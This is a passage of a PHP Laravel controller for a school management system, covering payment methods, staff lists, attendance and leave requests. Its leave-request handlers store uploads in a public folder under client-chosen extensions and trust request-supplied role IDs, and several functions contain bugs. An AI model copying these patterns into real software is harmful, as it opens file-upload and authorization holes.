                    Toastr::success('Operation successful', 'Success');
                    return redirect('payment-method');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function payment_delete(Request $request, $id)
    {

        try {
            $student_group = AramiscPaymentMethhod::destroy($id);

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($student_group) {
                    return ApiBaseMethod::sendResponse(null, 'Method has been deleted successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($student_group) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_payment_delete(Request $request,$school_id, $id)
    {

        try {
            $student_group = AramiscPaymentMethhod::where('school_id',$school_id)->where('id',$id)->delete();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($student_group) {
                    return ApiBaseMethod::sendResponse(null, 'Method has been deleted successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($student_group) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function staffList(Request $request)
    {

        try {
            $staffs = AramiscStaff::where('active_status', 1)->get();
            $roles = AramiscRole::where('active_status', '=', '1')->where('id', '!=', 2)->where('id', '!=', 3)->where(function ($q) {
                $q->where('school_id', 1)->orWhere('type', 'System');
            })->get();

            $staffs_api = DB::table('aramisc_staffs')

                ->where('aramisc_staffs.active_status', 1)
                ->join('roles', 'aramisc_staffs.role_id', '=', 'roles.id')
                ->join('aramisc_human_departments', 'aramisc_staffs.department_id', '=', 'aramisc_human_departments.id')
                ->join('aramisc_designations', 'aramisc_staffs.designation_id', '=', 'aramisc_designations.id')
                ->join('aramisc_base_setups', 'aramisc_staffs.gender_id', '=', 'aramisc_base_setups.id')
                ->select('aramisc_staffs.*','title','base_setup_name')
                ->get();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                return ApiBaseMethod::sendResponse($staffs_api, null);
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_staffList(Request $request, $school_id)
    {

        try {
            $staffs = AramiscStaff::where('active_status', 1)->where('school_id',$school_id)->get();
            $roles = AramiscRole::where('active_status', '=', '1')->where('id', '!=', 2)->where('id', '!=', 3)->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();

            $staffs_api = DB::table('aramisc_staffs')

                ->where('aramisc_staffs.active_status', 1)
                ->join('roles', 'aramisc_staffs.role_id', '=', 'roles.id')
                ->join('aramisc_human_departments', 'aramisc_staffs.department_id', '=', 'aramisc_human_departments.id')
                ->join('aramisc_designations', 'aramisc_staffs.designation_id', '=', 'aramisc_designations.id')
                ->join('aramisc_base_setups', 'aramisc_staffs.gender_id', '=', 'aramisc_base_setups.id')
                ->where('aramisc_staffs.school_id',$school_id)
                ->get();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                return ApiBaseMethod::sendResponse($staffs_api, null);
            }
            return view('backEnd.humanResource.staff_list', compact('staffs', 'roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function staffRoles(Request $request)
    {

        try {
            $roles = AramiscRole::where('active_status', '=', '1')
                ->where(function ($q) {
                    $q->where('school_id', 1)->orWhere('type', 'System');
                })
                ->select('id', 'name', 'type')
                ->where('id', '!=', 2)
                ->where('id', '!=', 3)
                ->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {


                return ApiBaseMethod::sendResponse($roles, null);
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_staffRoles(Request $request, $school_id)
    {

        try {
            $roles = AramiscRole::where('active_status', 1)
                ->where(function ($q) use($school_id){
                    $q->where('school_id', $school_id)->orWhere('type', 'System');
                })
                ->select('id', 'name', 'type')
                ->where('id', '!=', 2)
                ->where('id', '!=', 3)
                ->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {


                return ApiBaseMethod::sendResponse($roles, null);
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function roleStaffList(Request $request,$role_id)
    {


        try {

            $staffs_api = AramiscStaff::withOutGlobalScope(ActiveStatusSchoolScope::class)
                            ->where('school_id', 1)
                            ->where('role_id', $role_id)
                            ->with('roles', 'departments', 'designations', 'genders')
                            ->get();
            
            $staffs_api->map( function($staff) {
               
                
                    $staff->name = $staff->roles ? $staff->roles->name : null;
                    $staff->type = $staff->roles ? $staff->roles->type : null;
                    $staff->title = $staff->designations ? $staff->designations->title : null;
                    $staff->base_setup_name = $staff->genders ? $staff->genders->base_setup_name : null;
                    $staff->base_group_id = $staff->genders ? $staff->genders->base_group_id : null;
            })->toArray();


            // $staffs_api = DB::table('aramisc_staffs')

            //     ->where('aramisc_staffs.active_status', 1)
            //     ->where('role_id', '=', $role_id)
            //     ->join('roles', 'aramisc_staffs.role_id', '=', 'roles.id')
            //     ->join('aramisc_human_departments', 'aramisc_staffs.department_id', '=', 'aramisc_human_departments.id')
            //     ->join('aramisc_designations', 'aramisc_staffs.designation_id', '=', 'aramisc_designations.id')
            //     ->join('aramisc_base_setups', 'aramisc_staffs.gender_id', '=', 'aramisc_base_setups.id')
            //     ->get()->toArray();

            
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                return ApiBaseMethod::sendResponse($staffs_api, null);
            }
            return view('backEnd.humanResource.staff_list', compact('staffs', 'roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_roleStaffList (Request $request,$school_id, $role_id)
    {


        try {
            $staffs_api = AramiscStaff::withOutGlobalScope(ActiveStatusSchoolScope::class)
                            ->where('school_id', $school_id)
                            ->where('role_id', $role_id)
                            ->with('roles', 'departments', 'designations', 'genders')
                            ->get();
            
            $staffs_api->map( function($staff) {
             
                
                    $staff->name = $staff->roles ? $staff->roles->name : null;
                    $staff->type = $staff->roles ? $staff->roles->type : null;
                    $staff->title = $staff->designations ? $staff->designations->title : null;
                    $staff->base_setup_name = $staff->genders ? $staff->genders->base_setup_name : null;
                    $staff->base_group_id = $staff->genders ? $staff->genders->base_group_id : null;
            })->toArray();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                return ApiBaseMethod::sendResponse($staffs_api, null);
            }
            return view('backEnd.humanResource.staff_list', compact('staffs', 'roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function staffView(Request $request, $school_id, $id)
    {

        try {
            $staffDetails = AramiscStaff::where('school_id',$school_id)->find($id);
            if (!empty($staffDetails)) {
                $staffPayrollDetails = AramiscHrPayrollGenerate::where('staff_id', $id)->where('payroll_status', '!=', 'NG')->where('school_id',$school_id)->get();
                $staffLeaveDetails = AramiscLeaveRequest::where('staff_id', $id)->where('school_id',$school_id)->get();
                $staffDocumentsDetails = AramiscStudentDocument::where('student_staff_id', $id)->where('type', '=', 'stf')->where('school_id',$school_id)->get();
                $timelines = AramiscStudentTimeline::where('staff_student_id', $id)->where('type', '=', 'stf')->where('school_id',$school_id)->get();

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    $data = [];
                    $data['staffDetails'] = $staffDetails->toArray();
                    $data['staffPayrollDetails'] = $staffPayrollDetails->toArray();
                    $data['staffLeaveDetails'] = $staffLeaveDetails->toArray();
                    $data['staffDocumentsDetails'] = $staffDocumentsDetails->toArray();
                    $data['timelines'] = $timelines->toArray();

                    return ApiBaseMethod::sendError($data, null);
                }
            } else {
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    $data = [];
                    $data['staffDetails'] = $staffDetails->toArray();

                    return ApiBaseMethod::sendError($data, null);
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function staff_List(Request $request)
    {

        try {
            $staffs = AramiscStaff::where('active_status', 1)->get();
            $roles = AramiscRole::where('active_status', '=', '1')->where('id', '!=', 2)->where('id', '!=', 3)->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();

            $staffs_api = DB::table('aramisc_staffs')

                ->where('aramisc_staffs.active_status', 1)
                ->join('roles', 'aramisc_staffs.role_id', '=', 'roles.id')
                ->join('aramisc_human_departments', 'aramisc_staffs.department_id', '=', 'aramisc_human_departments.id')
                ->join('aramisc_designations', 'aramisc_staffs.designation_id', '=', 'aramisc_designations.id')
                ->join('aramisc_base_setups', 'aramisc_staffs.gender_id', '=', 'aramisc_base_setups.id')
                ->get();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                return ApiBaseMethod::sendResponse($staffs_api, null);
            }
            return view('backEnd.humanResource.staff_list', compact('staffs', 'roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_staff_List(Request $request, $school_id)
    {

        try {
            $staffs = AramiscStaff::where('active_status', 1)->where('school_id',$school_id)->get();
            $roles = AramiscRole::where('active_status', '=', '1')->where('id', '!=', 2)->where('id', '!=', 3)->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();

            $staffs_api = DB::table('aramisc_staffs')

                ->where('aramisc_staffs.active_status', 1)
                ->where('aramisc_staffsschool_id',$school_id)
                ->join('roles', 'aramisc_staffs.role_id', '=', 'roles.id')
                ->join('aramisc_human_departments', 'aramisc_staffs.department_id', '=', 'aramisc_human_departments.id')
                ->join('aramisc_designations', 'aramisc_staffs.designation_id', '=', 'aramisc_designations.id')
                ->join('aramisc_base_setups', 'aramisc_staffs.gender_id', '=', 'aramisc_base_setups.id')
                ->get();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                return ApiBaseMethod::sendResponse($staffs_api, null);
            }
            return view('backEnd.humanResource.staff_list', compact('staffs', 'roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function searchStaff(Request $request)
    {

        try {
            $staff = AramiscStaff::query();
            $staff->where('active_status', 1);
            if ($request->role_id != "") {
                $staff->where(function($q) use ($request) {
                    $q->where('role_id', $request->role_id)->orWhere('previous_role_id', $request->role_id);
                });
            }
            if ($request->staff_no != "") {
                $staff->where('staff_no', $request->staff_no);
            }

            if ($request->staff_name != "") {
                $staff->where('full_name', 'like', '%' . $request->staff_name . '%');
            }
            $staffs = $staff->get();
            $roles = AramiscRole::where('active_status', '=', '1')->where('id', '!=', 2)->where('id', '!=', 3)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['staffs'] = $staffs->toArray();
                $data['roles'] = $roles->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.humanResource.staff_list', compact('staffs', 'roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_searchStaff(Request $request, $school_id)
    {

        try {
            $staff = AramiscStaff::query();
            $staff->where('active_status', 1);
            if ($request->role_id != "") {
                $staff->where(function($q) use ($request) {
                    $q->where('role_id', $request->role_id)->orWhere('previous_role_id', $request->role_id);
                });
            }
            if ($request->staff_no != "") {
                $staff->where('staff_no', $request->staff_no);
            }

            if ($request->staff_name != "") {
                $staff->where('full_name', 'like', '%' . $request->staff_name . '%');
            }
            $staffs = $staff->where('school_id',$school_id)->get();
            $roles = AramiscRole::where('active_status', '=', '1')->where('id', '!=', 2)->where('id', '!=', 3)->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['staffs'] = $staffs->toArray();
                $data['roles'] = $roles->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.humanResource.staff_list', compact('staffs', 'roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function deleteStaff($id)
    {

        try {
            $staffs = AramiscStaff::find($id);
            $staffs->active_status = 0;
            $result = $staffs->update();

            if ($result) {
                $users = User::find($staffs->user_id);
                $users->active_status = 0;
                $results = $users->update();
            }
            Toastr::success('Operation successful', 'Success');
            return redirect()->back();
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_deleteStaff($school_id, $id)
    {

        try {
            $staffs = AramiscStaff::where('school_id',$school_id)->where('id',$id)->find();
            $staffs->active_status = 0;
            $result = $staffs->update();

            if ($result) {
                $users = User::where('school_id',$school_id)->find($staffs->user_id);
                $users->active_status = 0;
                $results = $users->update();
            }
            Toastr::success('Operation successful', 'Success');
            return redirect()->back();
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function staffAttendance(Request $request)
    {

        try {
            $roles = AramiscRole::where('active_status', '=', '1')->where('id', '!=', 1)->where('id', '!=', 2)->where('id', '!=', 3)->where('id', '!=', 10)->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($roles, null);
            }
            return view('backEnd.humanResource.staff_attendance', compact('roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_staffAttendance(Request $request, $school_id)
    {

        try {
            $roles = AramiscRole::where('active_status', '=', '1')->where('id', '!=', 1)->where('id', '!=', 2)->where('id', '!=', 3)->where('id', '!=', 10)
                ->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($roles, null);
            }
            return view('backEnd.humanResource.staff_attendance', compact('roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function staffAttendanceSearch(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'role' => 'required',
            'attendance_date' => 'required'
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $date = $request->attendance_date;

            $roles = AramiscRole::where('active_status', '=', '1')->where('id', '!=', 1)->where('id', '!=', 2)->where('id', '!=', 3)->where('id', '!=', 10)->where(function ($q) {
                $q->orWhere('type', 'System');
            })->get();
            $role_id = $request->role;
            $staffs = AramiscStaff::whereRole($request->role)->get();
            if ($staffs->isEmpty()) {
                Toastr::error('No result found', 'Failed');
                return redirect('staff-attendance');
            }
            $already_assigned_staffs = [];
            $new_staffs = [];
            $attendance_type = "";
            foreach ($staffs as $staff) {
                $attendance = AramiscStaffAttendence::where('staff_id', $staff->id)->where('attendence_date', date('Y-m-d', strtotime($request->attendance_date)))->first();
                if ($attendance != "") {
                    $already_assigned_staffs[] = $attendance;
                    $attendance_type =  $attendance->attendence_type;
                } else {
                    $new_staffs[] =  $staff;
                }
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['role_id'] = $role_id;
                $data['date'] = $date;
                $data['roles'] = $roles->toArray();
                $data['already_assigned_staffs'] = $already_assigned_staffs;
                $data['new_staffs'] = $new_staffs;
                $data['attendance_type'] = $attendance_type;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.humanResource.staff_attendance', compact('role_id', 'date', 'roles', 'already_assigned_staffs', 'new_staffs', 'attendance_type'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_staffAttendanceSearch(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'role' => 'required',
            'attendance_date' => 'required',
            'school_id' => 'required',
        ]);


        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $date = $request->attendance_date;

            $roles = AramiscRole::where('active_status', '=', '1')->where('id', '!=', 1)->where('id', '!=', 2)->where('id', '!=', 3)->where('id', '!=', 10)->where(function ($q) {
                $q->orWhere('type', 'System');
            })->get();
            $role_id = $request->role;
            $staffs = AramiscStaff::whereRole($request->role)->where('school_id',$request->school_id)->get();

            if ($staffs->isEmpty()) {
                return ApiBaseMethod::sendError('No result found', 'Failed');
            }
            $already_assigned_staffs = [];
            $new_staffs = [];
            $attendance_type = "";
            foreach ($staffs as $staff) {
                $attendance = AramiscStaffAttendence::where('staff_id', $staff->id)->where('attendence_date', date('Y-m-d', strtotime($request->attendance_date)))->where('school_id',$request->school_id)->first();
                if ($attendance != "") {
                    $already_assigned_staffs[] = $attendance;
                    $attendance_type =  $attendance->attendence_type;
                } else {
                    $new_staffs[] =  $staff;
                }
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['role_id'] = $role_id;
                $data['date'] = $date;
                $data['roles'] = $roles->toArray();
                $data['already_assigned_staffs'] = $already_assigned_staffs;
                $data['new_staffs'] = $new_staffs;
                $data['attendance_type'] = $attendance_type;
                return ApiBaseMethod::sendResponse($data, null);
            }

        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('No result found', 'Failed');
        }
    }
    public function staffAttendanceStore(Request $request)
    {
        try {
            foreach ($request->id as $staff) {
                $attendance = AramiscStaffAttendence::where('staff_id', $staff)->where('attendence_date', date('Y-m-d', strtotime($request->date)))->first();

                if ($attendance != "") {
                    $attendance->delete();
                }


                $attendance = new AramiscStaffAttendence();
                $attendance->staff_id = $staff;

                if (isset($request->mark_holiday)) {
                    $attendance->attendence_type = "H";
                } else {
                    $attendance->attendence_type = $request->attendance[$staff];
                    $attendance->notes = $request->note[$staff];
                }

                $attendance->attendence_date = date('Y-m-d', strtotime($request->date));
                $attendance->save();
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse(null, 'Staff attendance been submitted successfully');
            }
            Toastr::success('Operation successful', 'Success');
            return redirect('staff-attendance');
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_staffAttendanceStore(Request $request)
    {
        try {
            foreach ($request->id as $staff) {
                $attendance = AramiscStaffAttendence::where('staff_id', $staff)->where('attendence_date', date('Y-m-d', strtotime($request->date)))->where('school_id',$request->school_id)->first();

                if ($attendance != "") {
                    $attendance->delete();
                }


                $attendance = new AramiscStaffAttendence();
                $attendance->staff_id = $staff;

                if (isset($request->mark_holiday)) {
                    $attendance->attendence_type = "H";
                } else {
                    $attendance->attendence_type = $request->attendance[$staff];
                    $attendance->notes = $request->note[$staff];
                    $attendance->school_id = $request->school_id;
                }

                $attendance->attendence_date = date('Y-m-d', strtotime($request->date));
                $attendance->save();
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse(null, 'Staff attendance been submitted successfully');
            }
        } catch (\Exception $e) {
        }
    }
    public function staffAttendanceReport(Request $request)
    {


        try {

            $roles = AramiscRole::where('active_status', '=', '1')->where('id', '!=', 1)->where('id', '!=', 2)->where('id', '!=', 3)->where('id', '!=', 10)->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                return ApiBaseMethod::sendResponse($roles, null);
            }
            return view('backEnd.humanResource.staff_attendance_report', compact('roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_staffAttendanceReport(Request $request,$school_id)
    {


        try {

            $roles = AramiscRole::where('active_status', '=', '1')->where('id', '!=', 1)->where('id', '!=', 2)->where('id', '!=', 3)->where('id', '!=', 10)->where(function ($q) {
                $q->where('school_id', $school_id)->orWhere('type', 'System');
            })->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {

                return ApiBaseMethod::sendResponse($roles, null);
            }
            return view('backEnd.humanResource.staff_attendance_report', compact('roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function staffAttendanceReportSearch(Request $request)
    {

        $input = $request->all();
        $validator = Validator::make($input, [
            'role' => 'required',
            'month' => 'required',
            'year' => 'required'
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }


        try {
            $year = $request->year;
            $month = $request->month;;
            $role_id = $request->role;;
            $current_day = date('d');

            $days = cal_days_in_month(CAL_GREGORIAN, $request->month, $request->year);
            $roles = AramiscRole::where('id', '!=', 3)->where('id', '!=', 2)->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();

            $staffs = AramiscStaff::whereRole($request->role)->get();

            $attendances = [];
            foreach ($staffs as $staff) {
                $attendance = AramiscStaffAttendence::where('staff_id', $staff->id)->where('attendence_date', 'like', $request->year . '-' . $request->month . '%')->get();
                if (count($attendance) != 0) {
                    $attendances[] = $attendance;
                }
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['attendances'] = $attendances;
                $data['days'] = $days;
                $data['year'] = $year;
                $data['month'] = $month;
                $data['current_day'] = $current_day;
                $data['roles'] = $roles;
                $data['role_id'] = $role_id;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.humanResource.staff_attendance_report', compact('attendances', 'days', 'year', 'month', 'current_day', 'roles', 'role_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_staffAttendanceReportSearch(Request $request, $school_id)
    {

        $input = $request->all();
        $validator = Validator::make($input, [
            'role' => 'required',
            'month' => 'required',
            'year' => 'required'
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }


        try {
            $year = $request->year;
            $month = $request->month;;
            $role_id = $request->role;;
            $current_day = date('d');

            $days = cal_days_in_month(CAL_GREGORIAN, $request->month, $request->year);
            $roles = AramiscRole::where('id', '!=', 3)->where('id', '!=', 2)->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();

            $staffs = AramiscStaff::whereRole($request->role)->where('school_id',$school_id)->get();

            $attendances = [];
            foreach ($staffs as $staff) {
                $attendance = AramiscStaffAttendence::where('staff_id', $staff->id)->where('attendence_date', 'like', $request->year . '-' . $request->month . '%')->where('school_id',$school_id)->get();
                if (count($attendance) != 0) {
                    $attendances[] = $attendance;
                }
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['attendances'] = $attendances;
                $data['days'] = $days;
                $data['year'] = $year;
                $data['month'] = $month;
                $data['current_day'] = $current_day;
                $data['roles'] = $roles;
                $data['role_id'] = $role_id;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.humanResource.staff_attendance_report', compact('attendances', 'days', 'year', 'month', 'current_day', 'roles', 'role_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    // public function Approve_Leave_index(Request $request)
    // {

    //     try {
    //         $user = Auth::user();
    //         $staff = AramiscStaff::where('user_id', Auth::user()->id)->first();
    //         if (Auth()->user()->role_id == 1) {
    //             $apply_leaves = AramiscLeaveRequest::where([['active_status', 1], ['approve_status', '!=', 'P']])->get();
    //         } else {
    //             $apply_leaves = AramiscLeaveRequest::where([['active_status', 1], ['approve_status', '!=', 'P'], ['staff_id', '=', $staff->id]])->get();
    //         }
    //         $leave_types = AramiscLeaveType::where('active_status', 1)->get();
    //         $roles = AramiscRole::where('id', '!=', 1)->where('id', '!=', 2)->where('id', '!=', 3)->where(function ($q) {
    //             $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
    //         })->get();
    //         if (ApiBaseMethod::checkUrl($request->fullUrl())) {
    //             $data = [];
    //             $data['apply_leaves'] = $apply_leaves->toArray();
    //             $data['apply_leaves'] = $leave_types->toArray();
    //             $data['roles'] = $roles->toArray();
    //             return ApiBaseMethod::sendResponse($data, null);
    //         }

    //         return view('backEnd.humanResource.approveLeaveRequest', compact('apply_leaves', 'leave_types', 'roles'));
    //     } catch (\Exception $e) {
    //        return ApiBaseMethod::sendError('Error.', $e->getMessage());
    //     }
    // }
    public function saas_Approve_Leave_index(Request $request, $school_id)
    {


        try {
            $user = Auth::user();
            $staff = AramiscStaff::where('user_id', Auth::user()->id)->where('school_id',$school_id)->first();
            if (Auth()->user()->role_id == 1) {
                $apply_leaves = AramiscLeaveRequest::where([['active_status', 1], ['approve_status', '!=', 'P']])->where('school_id',$school_id)->get();
            } else {
                $apply_leaves = AramiscLeaveRequest::where([['active_status', 1], ['approve_status', '!=', 'P'], ['staff_id', '=', $staff->id]])->where('school_id',$school_id)->get();
            }
            $leave_types = AramiscLeaveType::where('active_status', 1)->where('school_id',$school_id)->get();
            $roles = AramiscRole::where('id', '!=', 1)->where('id', '!=', 2)->where('id', '!=', 3)->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['apply_leaves'] = $apply_leaves->toArray();
                $data['apply_leaves'] = $leave_types->toArray();
                $data['roles'] = $roles->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.humanResource.approveLeaveRequest', compact('apply_leaves', 'leave_types', 'roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function Approve_Leave_store(Request $request)
    {
        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'apply_date' => "required",
                'leave_type' => "required",
                'leave_from' => "required",
                'leave_to' => "required",
                'reason' => "required",
                'login_id' => "required",
                'role_id' => "required",
            ]);
        } else {
            $validator = Validator::make($input, [
                'staff_id' => "required",
                'apply_date' => "required",
                'leave_type' => "required",
                'leave_from' => "required",
                'leave_to' => "required",
                'reason' => "required",
            ]);
        }
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $fileName = "";
            if ($request->file('attach_file') != "") {
                $file = $request->file('attach_file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/leave_request/', $fileName);
                $fileName =  'public/uploads/leave_request/' . $fileName;
            }

            $user = Auth()->user();

            if ($user) {
                $login_id = $user->id;
                $role_id = $user->role_id;
            } else {
                $login_id = $request->login_id;
                $role_id = $request->role_id;
            }
            $leave_request_data = new AramiscLeaveRequest();
            $leave_request_data->staff_id = $login_id;
            $leave_request_data->role_id =  $role_id;
            $leave_request_data->apply_date = date('Y-m-d', strtotime($request->apply_date));
            $leave_request_data->type_id = $request->leave_type;
            $leave_request_data->leave_from = date('Y-m-d', strtotime($request->leave_from));
            $leave_request_data->leave_to = date('Y-m-d', strtotime($request->leave_to));
            $leave_request_data->approve_status = $request->approve_status;
            $leave_request_data->reason = $request->reason;
            $leave_request_data->file = $fileName;
            $result = $leave_request_data->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Leave Request has been created successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_Approve_Leave_store(Request $request)
    {
        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'apply_date' => "required",
                'leave_type' => "required",
                'leave_from' => "required",
                'leave_to' => "required",
                'reason' => "required",
                'login_id' => "required",
                'role_id' => "required",
                'school_id' => "required"
            ]);
        } else {
            $validator = Validator::make($input, [
                'staff_id' => "required",
                'apply_date' => "required",
                'leave_type' => "required",
                'leave_from' => "required",
                'leave_to' => "required",
                'reason' => "required",
                'school_id' => "required"
            ]);
        }
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $fileName = "";
            if ($request->file('attach_file') != "") {
                $file = $request->file('attach_file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/leave_request/', $fileName);
                $fileName =  'public/uploads/leave_request/' . $fileName;
            }

            $user = Auth()->user();

            if ($user) {
                $login_id = $user->id;
